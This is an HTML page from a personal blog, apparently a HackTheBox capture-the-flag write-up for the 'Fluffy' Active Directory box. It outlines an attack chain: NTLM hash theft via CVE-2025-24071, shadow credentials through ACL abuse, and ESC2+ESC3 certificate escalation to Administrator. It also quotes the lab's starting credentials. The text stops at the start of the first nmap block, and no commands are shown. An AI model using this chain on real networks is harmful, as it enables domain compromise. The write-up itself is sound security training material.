@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC2+ESC3 exploitation combination.">
+<title>HackTheBox - Fluffy</title>
+
+<link rel='canonical' href='/post/hackthebox-fluffy/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Fluffy">
+<meta property='og:description' content="Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC2+ESC3 exploitation combination.">
+<meta property='og:url' content='/post/hackthebox-fluffy/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Active Directory' /><meta property='article:tag' content='Netexec' /><meta property='article:tag' content='Certipy' /><meta property='article:tag' content='Bloodhound' /><meta property='article:tag' content='ADCS' /><meta property='article:tag' content='SMB' /><meta property='article:tag' content='ACL' /><meta property='article:tag' content='DACL' /><meta property='article:published_time' content='2025-09-20T22:28:58-05:00'/><meta property='article:modified_time' content='2025-09-20T22:28:58-05:00'/><meta property='og:image' content='/post/hackthebox-fluffy/Images/Banner.png' />
+<meta name="twitter:title" content="HackTheBox - Fluffy">
+<meta name="twitter:description" content="Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC2+ESC3 exploitation combination."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/post/hackthebox-fluffy/Images/Banner.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_f26bce75556ad0f0.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#leaked-vulnerability-notes-in-smb-share">Leaked vulnerability notes in SMB share</a></li>
+        <li><a href="#using-cve-2025-24071-to-steal-ntlm-hash">Using CVE-2025-24071 to steal NTLM hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ul>
+        <li><a href="#leveraging-bloodhound-to-enumerate-potential-escalation-paths">Leveraging Bloodhound to enumerate potential escalation paths</a></li>
+        <li><a href="#abusing-acl-genericall--genericwrite">Abusing ACL GenericAll &amp; GenericWrite</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#enumerating-adcs-with-certipy">Enumerating ADCS with Certipy</a></li>
+        <li><a href="#leveraging-certipy-to-abuse-esc2esc3">Leveraging Certipy to abuse ESC2+ESC3</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-fluffy/">
+                <img src="/post/hackthebox-fluffy/Images/Banner_hu_fea4a9c082d64970.png"
+                        srcset="/post/hackthebox-fluffy/Images/Banner_hu_fea4a9c082d64970.png 800w, /post/hackthebox-fluffy/Images/Banner_hu_ce33dda95c5581ab.png 1600w"
+                        width="800" 
+                        height="666" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Fluffy" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-fluffy/">HackTheBox - Fluffy</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Fluffy is an easy difficulty box focused on Active Directory exploitation. After finding notes on vulnerabilites intended to patch, we can exploit one as it is not yet fixed. From there, Bloodhound assists with showing excessive ACL permissions that allow us to create shadow credentials on service accounts, including ca_svc the certificate authority account. Certificates are misconfigured, allowing us to elevate to Administrator permissions via ESC2&#43;ESC3 exploitation combination.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 20, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="preface">Preface
+</h2><p>To start the box off we are given initial user credentials in the Machine Information:</p>
+<blockquote>
+<p>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!</p></blockquote>
+<h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
